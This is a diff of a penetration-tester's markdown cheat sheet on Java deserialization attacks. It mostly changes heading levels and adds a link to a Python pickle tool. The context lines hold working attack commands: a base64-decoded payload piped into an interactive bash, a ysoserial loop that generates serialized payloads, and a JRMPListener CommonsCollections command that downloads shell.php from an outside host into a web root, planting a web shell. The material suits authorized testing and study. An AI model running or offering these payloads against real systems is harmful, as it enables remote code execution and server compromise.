@@ -373,7 +373,7 @@ bash -c {echo,payload_base64}|{base64,-d}|{bash,-i}
 
 https://www.bugku.net/runtime-exec-payloads/
 
-### Tools
+#### Tools
 
 https://github.com/frohoff/ysoserial
 
@@ -381,7 +381,7 @@ https://github.com/NickstaDB/SerializationDumper
 
 https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java
   
-### Script
+#### Script
   
 codes/deserialization/java/gserial.sh
   
@@ -399,21 +399,27 @@ java -jar ysoserial.jar $payload "sleep 5" | base64 | tr -d '\n' > $payload.ser;
   
 echo "-----------------Loading-----------------\n\n"; done < payloads.txt
  
-### Signals
+#### Signals
   
-#### Bad Sign
+-> Bad Sign
 
--> ClassNot FoundException
+ClassNot FoundException
 
-#### Good Sign
+-> Good Sign
 
--> java.io.IOException
+java.io.IOException
   
-### JRMPClient and JRMPListener (CommonsCollections)
+#### JRMPClient and JRMPListener (CommonsCollections)
   
 java -jar ysoserial-all.jar “JRMPClient” ip:80” |base64 -w0
 
 java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 80 CommonsCollections “curl http://ip:port/shell.php -o /var/www/shell.php”
+  
+### Python Deserialization
+
+#### Tool
+
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/python/py_pickle.py
   
 ## Cloud
 
